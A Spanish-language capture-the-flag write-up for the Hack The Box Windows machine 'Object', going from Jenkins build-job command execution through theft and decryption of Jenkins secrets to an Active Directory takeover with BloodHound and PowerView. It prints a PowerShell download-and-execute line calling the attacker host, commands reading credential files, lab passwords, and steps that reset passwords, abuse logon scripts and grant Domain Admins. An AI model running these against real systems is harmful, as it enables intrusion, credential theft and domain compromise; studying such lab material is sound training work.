---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Object             |
| Os                     | Windows            |
| Difficulty             | Hard               |
| Points                 | 0                  |
| IP                     | 10.10.11.132       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Object/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.132
```

![nmap 1](/assets/images/Object/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.132 -oG allPorts
```

![nmap2](/assets/images/Object/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,80,2222 10.10.11.132 -oN targeted
```

![nmap 3](/assets/images/Object/nmap3.png)

Navegando por el sitio que da la ip, encontramos un dominio que agregaremos en nuestro etc/hosts para poder visualizar bien el servicio

![domain](/assets/images/Object/object_htb.png)

Con whatweb tenemos a la vista un correo potencial del dominio.

![whatweb](/assets/images/Object/whatweb.png)

Una vez ingresando en la pagina, podemos acceder al servicio en el puerto 8080 (jenkins) creando una cuenta

![create account](/assets/images/Object/create_account.png)

Despues de navegar por el servicio vemos que podemos programar una tarea para que sea ejecutada, desde nuestro perfil, le dareos click en MyViews/NewItem/ nombramos el proyecto y seleccionamos la opcion "freestyle project", ahora en la parte de "Source Code Management"/ seleccionamos Build Windows Command y probamos ejecutando el comando:

```s
cmd /c whoami
```

Como no tendremos los permisos de ejecusion, tambien seleccionaremos la parte de Builder Triggers/Build periodically y ponemos * * * * * para ejecutar cada minuto como las tareas de linux.

Le damos a Apply y guardar, esperamos que se cargue el comando.

![Option 1](/assets/images/Object/output_cmd.png)

Esta seria la opcion 1 de escribir comandos en jenkins, la segunda seria en lugar de ejecutar los comandos periodicamente, nos vamos a la opcion de Builder Triggers/Trigger builds remotely, tendremos que crear antes un token en la configuracion de nuestro perfil, y poner en esta parte el nombre del token que hemos puesto y asi poder tramitar la peticion del comando a traves del url de la siguiente manera:

```s
curl -s -X GET "http://rebick:116ae1c5c823ebce3c7cb088751fcef387@object.htb:8080/job/project%201/build?token=MyToken"
```

Y con exito hemos ejecutado remotamente el comando.

lo siguiente seria probar algunos comandos mas como:

```s
#Para validar si se contiene Powershell
cmd /c powershell -c "whoami"
#Para probar la comunicacion con nuestra maquina atacante solo abriremos un servidor con python y
cmd /c powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.29/test')
```

No se pudo realizar la peticion de Get al servidor, entonce lo siguiente podria ser enumerar reglas de firewall:

```s
cmd /c powershell -c Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True 
```

![Firewall Rules](/assets/images/Object/firewall_rules.png)

La respuesta significa en la parte de:
- DisplayName: Las ultimas letras dan significado a Domain controller y esta enabled, por lo que no podremos acceder por ahora.

Lo siguiente seria enumerar las reglas permitidas 

```s
cmd /c powershell -c Get-NetFirewallRule -Direction Outbound -Action Allow -Enabled True 
```

Con ayuda del navegador podemos filtrar por ICMP4-Out

![ICMP4-Out](/assets/images/Object/ICMP04.png)

O podemos usar el <a href="https://itluke.online/2018/11/27/how-to-display-firewall-rule-ports-with-powershell/">oneliner</a> para listar las reglas permitidas en un formato mas legible, que es:

```powershell
cmd /c powershell -c "Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True | Format-Table -Property Name,DisplayName, DisplayGroup, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}}, @{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, @{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile, Direction, Action"
```

![oneliner](/assets/images/Object/ps_cheat.png)

Ahora como no hemos podido ver reglas interesantes, sigamos enumerando informacion, intentaremos listar informacion de configuracion de jenkins con el comando:

```s
cmd /c powershell -c "ls ../../"
cmd /c powershell -c "cat ../../config.xml"
cmd /c powershell -c "cat ../../users/admin_17207690984073220035/config.xml"
```

Ahora en el ultimo archivo obtuvimos la potencial contrasena que al parecer no se encuentra en base64, asi que nos copiaremos el archivo config ya que hay vias potenciales de obtener la contrasena, que para usarla usaremos los siguientes comandos:

```s
curl -L \
  "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$(uname -s)_$(uname -m)" \
   -o jenkins-credentials-decryptor

chmod +x jenkins-credentials-decryptor
```

Como necesitamos la masterkey y el hudson, nos iremos al directorio secrets y para obtener lo que necesitamos:

```s
cmd /c powershell -c "cat ../../secrets/hudson.util.Secret"
cmd /c powershell -c "cat ../../secrets/master.key"
```

![masterkey](/assets/images/Object/masterkey.png)

![hudson](/assets/images/Object/hudson.png)

El archivo hudson al parecer es un archivo binario, para poder traerlo de manera correcta con powershell podemos intentar hacer un:

```powershell
cmd /c powershell -c [convert]::ToBase64String((cat ../../secrets/hudson.util.Secret -Encoding byte))
```

Para guardarlos en el archivo ahora decodeados

```s
echo "gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=" | base64 -d > hudson.util.Secret
```

Y ahora que tenemos los secrets necesarios, solo necesitamos usar la herramienta anterior de la manera siguiente:

```s
#Como me salia error por el masterkey, tuve que quitar el salto de linea con:
cat master.key | tr -d '\n' | sponge master.key
#Para iniciar el programa que desencripta el jenkins
./jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml
```

![jenkins decripted](/assets/images/Object/jenkins_decripted.png)

Lo siguiente seria intentar conectarse a la maquina con evil-winrm

```s
evil-winrm -i 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'
```

Ahora tenemos acceso a la flag en el Desktop, para seguir buscando la manera de escalar los privilegios lo siguiente seria:

![net user](/assets/images/Object/net_user.png)

Vemos que tenemos ahora que ganarnos el usuario Maria.

![net user maria](/assets/images/Object/net_user_maria.png)

Como maria forma parte del grupo de remote management use nos podriamos conectar remotamente con evilwinrm 

Ahora usaremos el bloodhound como en la maquina Forest, con el mismo injestor y version.

Para descargarnos el injestor:

```s
upload /home/rebick/Documents/HtB/Object/SharpHound.ps1
```

Y ahora para ejecutarlo:

```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
#Para descargarlo y cambiarle el nombre
download C:\ProgramData\bh\20220720110042_BloodHound.zip data.zip
```

Para ejecutar bloodhound en segundo plano:

```s
neo4j console
bloodhound &> /dev/null &
```

La manera mas corta de convertirse en Admin es:

![BloodHound](/assets/images/Object/bloodhound.png)

El primer punto de entrada es:

![BloodHound](/assets/images/Object/start_point.png)

Esto nos dice que el primer paso es que Oliver tiene permiso para cambiarle la contrasena a Smith, para poder usar el siguiente script, descargaremos y cargaremos a la maquina victima el powerxploit:

```s
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

#En la maquina victima
upload PowerView.ps1
Import-Module ./PowerView.ps1
```

para esto haremos:

```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity smith -AccountPassword $SecPassword
```

![sMIT oWNED](/assets/images/Object/smith_owned.png)

El siguiente usuario a ganar segun BH es Maria:

![BloodHound 2](/assets/images/Object/bh2.png)

De acuerdo a bloodhound hay que ejecutar un ataque kerberoasting y obtener un hash, pero en este caso no se podra crackear por que el usuario utiliza una contrasena robusta.
Algo que se puede hacer es un AD logon script user, que nos permitira escribir datos cada que maria en este caso inicie sesion

```powershell
echo 'dir C:\Users\Maria\Desktop\ > C:\ProgramData\bh\output.txt' > test.ps1

Set-DomainObject -Identity maria -SET @{scriptpath='C:\ProgramData\bh\test.ps1'}
```

![maria test 1](/assets/images/Object/maria_test1.png)

Como se ha ejecutado el comando que queremos con el usuario Maria, lo siguiente que podemos hacer es traernos el archivo que esta en el Escritorio de Maria de la manera siguiente:

```powershell
echo 'copy C:\Users\Maria\Desktop\Engines.xls C:\ProgramData\bh\Engines.xls' > test.ps1
```

Dentro de este archivo estan unas contrasenas que intentando cada una de ellas conectarnos como maria, daremos con la correcta que es W3llcr4ft3d_4cls

![maria owned](/assets/images/Object/maria_owned.png)

```powershell
cd C:\ProgramData\bh
Import-Module ./PowerView.ps1

Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity Maria

Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights All -PrincipalIdentity Maria
```

Ahora a nivel de dominio nos agregamos como usuario admin de dominio

```s
net group "Domain Admins" Maria /add /domain
```

![root](/assets/images/Object/root.png)

![powned](/assets/images/Object/powned.png)